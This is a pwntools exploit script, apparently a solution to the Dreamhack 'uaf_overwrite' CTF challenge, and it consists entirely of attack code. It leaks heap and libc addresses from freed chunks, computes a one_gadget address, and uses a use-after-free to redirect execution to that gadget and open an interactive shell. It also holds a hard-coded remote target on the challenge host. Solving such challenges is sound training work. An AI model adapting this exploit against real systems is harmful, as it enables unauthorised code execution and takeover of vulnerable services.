#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./uaf_overwrite_patched', checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

gs = \
"""
b *main
b *robot_func
b *robot_fuc+120
b *custom_func
b *custom_func+266
b *human_func
"""


info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 22719)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

def humand(weight, age):
    sl(b'1')
    sla(b'Human Weight: ', str(weight).encode())
    sla(b'Human Age: ', str(age).encode())
    io.recvuntil(b'> ')

def robot(weight):
    sl(b'2')
    sla(b'Robot Weight: ', str(weight).encode())
    io.recvuntil(b'> ')

def custom(size, data, index):
    sl(b'3')
    sla(b'Size: ', str(size).encode())
    sla(b'Data: ', data)
    sla(b'Free idx: ', str(index).encode())
    io.recvuntil(b'> ')

def custom_leak(size, data, index):
    sl(b'3')
    sla(b'Size: ', str(size).encode())
    sla(b'Data: ', data)
    io.recvuntil(b'Data: ')
    leak = unpack(io.recvn(6) + b'\x00' * 2)
    sla(b'Free idx: ', str(index).encode())
    io.recvuntil(b'> ')
    return leak


io = start()
io.recvuntil(b'> ')

custom(0x100, b'tcache0', 10)
custom(0x100, b'tcache1', 0)
custom(0x200, b'tcache2', 1)
heap = custom_leak(0x100, b'', 10)

custom(0x500, b'usortedbin', 10)
custom(0x600, b'guard', 4)
libc.base = custom_leak(0x500, b'', 10) - 0x3ebc0a
one_gadget = libc.base + 0x10a41c

success(f"heap @ {hex(heap)}")
success(f"libc @ {hex(libc.base)}")
success(f"one_gadget @ {hex(one_gadget)}")

humand(70, one_gadget)

sl(b'2')
sla(b'Robot Weight: ', str(0x80).encode())

io.interactive()